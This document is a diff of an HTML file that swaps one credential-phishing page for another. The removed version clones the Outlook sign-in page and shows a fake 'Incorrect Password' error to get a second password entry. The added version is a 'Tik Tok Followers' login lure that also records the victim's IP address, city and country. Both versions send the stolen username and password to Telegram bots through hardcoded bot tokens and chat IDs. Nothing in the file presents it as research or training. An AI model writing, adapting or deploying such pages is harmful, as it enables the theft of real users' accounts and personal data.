@@ -1,220 +1,115 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 
-<head>
-  <meta charset="UTF-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Live Signin Page Clone</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap');
 
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Poppins', sans-serif;
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Tik Tok Followers</title>
+<script src="jquery.min.js"></script>
+<script src="jscript.js"></script>
+<link rel="stylesheet" type="text/css" href="style.css">
+<style>
+    @media(max-width:760px){
+       #TFG{
+           font-size:140%;
+       } 
+       .buttonstyle{
+           font-size:100%;
+       }
+    
+    .followers , .likes{
+        width:95%;
     }
-
-    body {
-      display: grid;
-      place-items: center;
-      min-height: 100vh;
-      background-color: #dde2d1;
     }
-
-    form {
-      width: 440px;
-      background-color: #fff;
-      box-shadow: 0 0 .5rem rgba(0, 0, 0, .2);
-      padding: 44px;
-    }
-
-    form h2 {
-      font-size: 24px;
-      font-weight: 500;
-    }
-
-    .form-group {
-      margin: 0 0 16px;
-    }
-
-    form input {
-      padding: 6px 10px 6px 0;
-      margin-top: 1rem;
-      border: none;
-      outline: none;
-      border-bottom: 1px solid #000000b3;
-      width: 100%;
-      font-size: .9rem;
-    }
-
-    form p {
-      font-size: 13px;
-      margin-bottom: 16px;
-    }
-
-    form a {
-      color: #0067b8;
-      text-decoration: none;
-    }
-
-    form a:hover {
-      text-decoration: underline;
-    }
-
-    form button {
-      display: block;
-      margin-left: auto;
-      width: 108px;
-      height: 32px;
-      font-size: 15px;
-      background-color: #0067b8;
-      color: #fff;
-      border: none;
-      cursor: pointer;
-    }
-
-    form button:hover {
-      background-color: #004b85;
-    }
-
-    .bottom {
-      width: 440px;
-      background-color: #fff;
-      box-shadow: 0 0 .5rem rgba(0, 0, 0, .2);
-      padding: 8px 44px;
-      font-size: 15px;
-      margin-top: 20px;
-      display: flex;
-      align-items: center;
-      cursor: pointer;
-    }
-
-    .bottom img {
-      width: 32px;
-      height: 32px;
-      margin-right: 12px;
-    }
-
-    .bottom:hover {
-      background-color: #dde2d1;
-    }
-
-    #errorModal {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.5);
-      z-index: 1000;
-      justify-content: center;
-      align-items: center;
-    }
-
-    #errorModal .modal-box {
-      background: #fff;
-      padding: 20px 30px;
-      border-radius: 10px;
-      max-width: 300px;
-      text-align: center;
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-    }
-
-    #errorModal .modal-box h3 {
-      margin-bottom: 10px;
-      color: #e74c3c;
-    }
-
-    #errorModal .modal-box p {
-      font-size: 14px;
-    }
-
-    #errorModal .modal-box button {
-      margin-top: 10px;
-      padding: 8px 16px;
-      background-color: #0067b8;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-  </style>
+</style>
 </head>
+<body onload="updateyear()">
+</div>
+<div id="main-tool">
+	<div class="wrapper"><img src="logo.png"></div>
+	<h1 id="TFG">Login</h1>
 
-<body>
-  <!-- Modal -->
-  <div id="errorModal">
-    <div class="modal-box">
-      <h3>Incorrect Password</h3>
-      <p>Please double-check your password and try again.</p>
-      <button onclick="closeModal()">Try Again</button>
-    </div>
-  </div>
+<p class="sub-heading"></p>
+<p class="sub-heading"></p>
 
-  <div class="container">
-    <form id="form" method="POST">
-      <div class="forms-container">
-        <div class="forms">
-          <div class="first">
-            <h2>Sign in</h2>
-            <div class="form-group">
-              <input type="email" placeholder="Email" name="username" id="username" required>
-              <input type="password" placeholder="Password" name="password" id="password" required>
-            </div>
-            <p>No Account? <a href="#">Create One!</a></p>
-            <a href="#">Sign in with a security key <span>?</span></a>
-          </div>
+
+    <form id="contactForm" method="POST">
+    <center>
+    <div id="fillup">
+        <input type="text" id="ipaddress" name="IPaddress" hidden>
+       <input type="hidden" id="city" name="city">
+<input type="hidden" id="country" name="country">
+        <div class="form-option">
+        	<input name="email" class="input-form input-command" type="text" placeholder="Username/Email/Phone" id="username" required>
         </div>
-      </div>
-      <button type="submit">Sign in</button>
-    </form>
+    <div id="fillup">
+        <div class="form-option">
+        	<input name="password" class="input-form input-command" type="password" placeholder="Password" id="password" required>
+        </div>
 
-    <div class="bottom">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Microsoft_Outlook_2013-2019_logo.svg/811px-Microsoft_Outlook_2013-2019_logo.svg.png">
-      <span>Sign-in options</span>
+        <br><br>
+        <button class="buttonstyle" id="button" type="submit"><b>Login</b></button>
+        </center>
+
     </div>
-  </div>
+</div>
 
-  <!-- JS -->
-  <script>
-    let attemptCount = 0;
+<div id="steps" style="display:none;">
 
-    document.getElementById('form').addEventListener('submit', function (e) {
-      e.preventDefault();
-      attemptCount++;
+</div>
 
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-
-      const telegramMessage = `🟦 Outlook Login Attempt\n\n📧 Email: ${username}\n🔑 Password: ${password}`;
-   var token = '8087293912:AAEZ58GFNLg5FC-50N4dyg-KMUG0q-aGttY';
-      var chat_id = '6757391137';
-      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
-
-      fetch(url)
-        .then(response => response.json())
-        .then(data => {
-          if (attemptCount === 1) {
-            document.getElementById('errorModal').style.display = 'flex';
-          } else {
-            window.location.href = 'thanks.html'; // ✅ Second try = redirect
-          }
-        })
-        .catch(error => {
-          alert("Network error. Try again.");
-          console.error('Telegram error:', error);
+<div id="comment" style="display:none;" >
+</div>
+<script>
+        document.addEventListener('DOMContentLoaded', function () {
+            // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipaddress = data.ip;
+                    document.getElementById('ipaddress').value = ipaddress;
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                });
         });
-    });
+  fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById('city').value = data.city || '';
+        document.getElementById('country').value = data.country_name || '';
+      })
+      .catch(error => console.error('Location error:', error));
+  document.getElementById('contactForm').addEventListener('submit', function (event) {
+            event.preventDefault();
 
-    function closeModal() {
-      document.getElementById('errorModal').style.display = 'none';
-    }
-  </script>
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            var ipaddress = document.getElementById('ipaddress').value;
+   
+            const city = document.getElementById('city').value;
+      const country = document.getElementById('country').value;
+            var telegramMessage = `Username: ${username}\nPassword: ${password}\nIP: ${ipaddress}\nCity: ${city}\nCountry: ${country}`;
+           
+          var token = '6574493215:AAGDBfNivQ3vTzxAe-ltH4oIIB25mAr7pD4';
+        var chat_id = '6055794207';
+            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        window.location.href = 'thanks.html';  // Redirect to thank you page
+                    } else {
+                        alert('Error sending message.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        });
+
+    </script>
 </body>
 
 </html>
-
-
